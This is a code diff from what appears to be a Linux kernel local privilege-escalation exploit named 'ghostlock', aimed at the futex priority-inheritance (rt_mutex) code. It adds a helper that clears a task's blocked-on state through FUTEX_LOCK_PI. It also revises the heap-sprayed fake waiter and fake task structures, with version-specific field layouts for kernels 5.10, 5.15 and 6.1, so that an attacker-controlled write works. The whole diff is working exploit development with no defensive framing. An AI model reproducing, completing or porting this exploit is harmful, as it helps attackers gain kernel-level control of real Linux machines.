@@ -159,6 +159,27 @@ namespace ghostlock::support {
         return syscall(SYS_futex, uaddr, op, val, timeout_or_value, uaddr2, val3);
     }
 
+    long ghost_disarm(const char *why, int32_t *err_out) {
+        /* "Owned by tid == getpid(), waiters": forces the blocking PI path, the
+         * only one that rewrites task->pi_blocked_on. */
+        uint32_t dummy_word = 0x80000000U | static_cast<uint32_t>(getpid());
+        struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
+        errno = 0;
+        long ret = futex_op(&dummy_word, FUTEX_LOCK_PI, 0, &expired, nullptr, 0);
+        const int32_t saved = errno;
+        if (err_out) *err_out = saved;
+        if (ret == 0) {
+            /* Took the lock instead of blocking: nothing was cleared. Release
+             * it so a later call is not blocked by this one. */
+            (void) futex_op(&dummy_word, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
+            pr_warning("ghost disarm (%s) took the fast path; pi_blocked_on NOT cleared\n", why);
+        } else if (saved != ETIMEDOUT) {
+            pr_warning("ghost disarm (%s) ret=%ld errno=%d; not the timeout path\n",
+                       why, ret, saved);
+        }
+        return ret;
+    }
+
     long sched_setattr_tid(int32_t tid, int32_t nice_value) {
         kernel::local_sched_attr attr;
         memset(&attr, 0, sizeof(attr));
@@ -370,12 +391,20 @@ namespace ghostlock::support {
 
         const profile::kernel_offsets *v = profile_values();
         int32_t compact = session::g_exploit_session.profile.has_compact_waiter();
+        /* compact covers 5.10 (prio at +0x40) and 5.15/6.1 (wake_state at +0x40,
+         * prio at +0x44) alike; only the profile's release can tell them apart. */
+        const bool wake_state_layout =
+                compact && session::g_exploit_session.profile.compact_waiter_has_wake_state();
 
         for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
             unsigned char *p = skb_buf() + chunk + chunk_bias;
 
             put32(p, kernel::LOCK_OFF + 0x00, 0);
-            put64(p, kernel::LOCK_OFF + 0x08, (session::g_exploit_session.heap.current.fake_w0));
+            /* The root must be empty: the enqueue's `while (*link)` descent
+             * starts here, and a root at the page waiter walks attacker child
+             * slots. Empty, the loop exits at once; rb_leftmost must still be a
+             * valid waiter for rb_first_cached(). */
+            put64(p, kernel::LOCK_OFF + 0x08, 0);
             put64(p, kernel::LOCK_OFF + 0x10, (session::g_exploit_session.heap.current.fake_w0));
             put64(p, kernel::LOCK_OFF + 0x18, (session::g_exploit_session.heap.current.fake_task) | 1);
 
@@ -389,16 +418,28 @@ namespace ghostlock::support {
                 put64(p, kernel::W0_OFF + 0x00, 1); /* tree_entry.rb_parent_color */
                 put64(p, kernel::W0_OFF + 0x08, 0); /* tree_entry.rb_right */
                 put64(p, kernel::W0_OFF + 0x10, 0); /* tree_entry.rb_left */
-                (void) encode_compact_waiter(
-                    {
-                        reinterpret_cast<std::byte *>(p + kernel::W0_OFF),
-                        memory::kCompactWaiterBytes
-                    },
-                    *request, write_layout);
+                /* The pi node carries the route's stack-stamp triple. The
+                 * left-only arm {pc = value, right = 0, left = target} stores
+                 * unconditionally; `left = target` is what descents chase, so
+                 * this node must never be descended from. */
+                const memory::WaiterTreeStamp pi_stamp =
+                        memory::waiter_tree_stamp(write_layout);
+                put64(p, kernel::W0_OFF + 0x18, pi_stamp.pc);    /* pi pc    = value / parent */
+                put64(p, kernel::W0_OFF + 0x20, pi_stamp.right); /* pi right                  */
+                put64(p, kernel::W0_OFF + 0x28, pi_stamp.left);  /* pi left                   */
                 put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                 put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
-                put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
-                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
+                /* +0x40 is `int prio` on 5.10; 5.15/6.1 put wake_state there
+                 * and prio at +0x44. The wrong shape reads as prio = 0
+                 * (highest) and the prio > 120 erase gate never runs; the
+                 * profile's release decides which shape this is. */
+                if (wake_state_layout) {
+                    put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
+                    put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
+                } else {
+                    put32(p, kernel::W0_OFF + 0x40, kernel::FAKE_WAITER_PRIO); /* prio */
+                    put32(p, kernel::W0_OFF + 0x44, 0); /* 5.10 padding before deadline */
+                }
                 put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
                 put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
             } else {
@@ -447,7 +488,10 @@ namespace ghostlock::support {
             put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_nprio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_pi_lock_off, 0);
-            /* Empty PI waiters avoid tree rebalancing during reinsertion. */
+            /* pi_waiters stays EMPTY. With a root, dequeue_pi() erases the node
+             * without repointing the root and the next enqueue_pi descends from
+             * the stale root into .data. Empty, the enqueue installs the stack
+             * waiter as root and task_has_pi_waiters() is false. */
             put64(p, fake_task_off + ft_pi_wait_off, 0);
             put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
             put64(p, fake_task_off + ft_tg_off, task_group);
